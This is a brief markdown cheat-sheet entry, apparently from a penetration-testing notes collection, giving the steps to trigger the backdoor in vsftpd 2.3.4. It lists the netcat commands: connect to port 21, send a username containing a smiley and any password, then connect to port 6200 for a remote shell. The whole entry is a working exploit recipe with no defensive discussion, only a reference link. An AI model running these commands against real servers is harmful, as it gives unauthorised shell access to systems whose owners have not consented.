## RCE in vsftpd 2.3.4

1. `nc {ip} 21`
2. `USER: random :)`
3. `PASS: random`
4. get shell by `nc {ip} 6200`

Ref: https://westoahu.hawaii.edu/cyber/forensics-weekly-executive-summmaries/8424-2/ 